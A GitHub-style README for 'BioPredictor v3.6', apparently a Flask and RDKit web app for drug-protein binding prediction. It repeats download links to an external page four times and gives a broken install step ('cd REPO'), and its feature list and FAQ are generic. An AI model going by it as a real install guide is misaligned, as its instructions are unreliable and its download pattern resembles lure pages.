# BioPredictor v3.6 - bioinformatics web app 2026

> **BioPredictor is a browser-based bioinformatics application for drug-protein interaction analysis, pairing machine learning, binding affinity prediction, and 3D target visualization in version 3.6.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.6-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/sean-ross29/biopredictor-protein-interact?style=flat-square)](https://github.com/sean-ross29/biopredictor-protein-interact)

---

<p align="center">
  <a href="https://sean-ross29.github.io/biopredictor-protein-interact/">
    <img src="https://img.shields.io/badge/Download-BioPredictor%20Latest-brightgreen?style=for-the-badge" alt="Download BioPredictor">
  </a>
</p>

> **[Direct Download - BioPredictor v3.6](https://sean-ross29.github.io/biopredictor-protein-interact/)**

---

[Download Latest Build](https://sean-ross29.github.io/biopredictor-protein-interact/)

---

## Overview

BioPredictor gives researchers a web-first workflow for examining drug-protein interaction behavior without leaving the browser. It brings together machine learning-based binding affinity prediction and interaction analysis, making it a practical option for virtual screening and early bioinformatics evaluation.

Under the hood, the application uses Flask for delivery, RDKit for molecular handling, and a balanced random forest model for classification-focused prediction. It also offers 3D target rendering, so results can be reviewed visually alongside the computed outputs.

---

## What it does

- Estimates drug-protein binding affinity from molecular inputs
- Handles drug-protein interaction and target interaction prediction
- Relies on molecular fingerprints and amino acid composition features
- Uses a balanced random forest method for classification
- Provides a REST API backend for programmatic use
- Shows molecular targets in 3D for visual review
- Supports machine learning workflows used in virtual screening
- Built with Flask and RDKit as core parts of the stack

---

## Installation

You can clone the repository or download it directly, then open it in the web environment you prefer.

git clone https://github.com/sean-ross29/biopredictor-protein-interact.git
cd REPO

For local use, start the web application through the repository's provided entry point, then open the app in your browser.

---

## Usage

1. Open the web application in a browser.
2. Enter the required drug and protein input data.
3. Run the prediction flow to estimate binding affinity or interaction probability.
4. Inspect the returned output and, when available, review the 3D target visualization.
5. Use the REST API if you need to connect predictions to another pipeline.

For API-driven workflows, submit the payload expected by the backend and handle the returned response in your own tooling.

---

## Configuration

Application settings are usually managed on the app side and can be adjusted through Flask environment variables or repository config files.

Example environment setup:

FLASK_ENV=production
FLASK_APP=app.py

If the repository includes model, feature, or visualization options, update the corresponding configuration file before launching the application.

---

## Requirements

- Web browser for access and interaction
- Python-based runtime for the Flask backend
- RDKit for molecular processing
- Machine learning support for the random forest workflow
- Storage space for project files, model assets, and any local data you add

---

## FAQ

**How can I obtain the newest release?**  
Use the download link above to access the current build.

**Is it possible to adjust prediction behavior?**  
Yes. If your local deployment exposes configuration files or environment variables, you can modify them before starting the app.

**What powers the prediction results?**  
The application uses machine learning features such as molecular fingerprints and amino acid composition, together with a balanced random forest model.

**What should I check if the web app fails to load?**  
Verify your runtime setup, make sure the required dependencies are installed, and inspect the backend logs for startup problems.

**Does the project include an API?**  
Yes, a REST API backend is included for external integration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
